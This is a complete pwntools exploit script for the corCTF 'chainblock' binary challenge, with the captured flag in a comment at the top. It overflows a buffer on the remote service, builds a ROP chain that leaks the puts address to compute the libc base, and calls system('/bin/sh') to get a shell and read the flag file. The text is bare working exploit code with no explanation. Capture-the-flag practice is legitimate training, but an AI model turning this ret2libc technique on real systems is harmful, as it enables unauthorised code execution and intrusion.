#corctf{mi11i0nt0k3n_1s_n0t_a_scam_r1ght}
from pwn import *

elf = ELF("./chainblock")
libc = ELF("./libc.so.6")

target = remote("pwn.be.ax", 5000)

popRdi = p64(0x0000000000401493)
ret = p64(0x000000000040101a)
target.sendline("A"*0x100 + ret*5 + popRdi + p64(elf.got['puts']) + p64(0x40141a) + p64(elf.sym['verify']))

target.recvuntil("identity!\n")
libc_base = u64(target.recvline().strip().ljust(8, "\x00")) - libc.sym['puts']
log.info("LIBC Base: " + hex(libc_base))

target.sendline("A"*0x100 + ret*4 + popRdi + p64(libc_base + libc.search("/bin/sh\x00").next()) + p64(libc_base + libc.sym['system']))
target.recvuntil("identity!\n")
target.sendline("cat flag.txt")

target.interactive()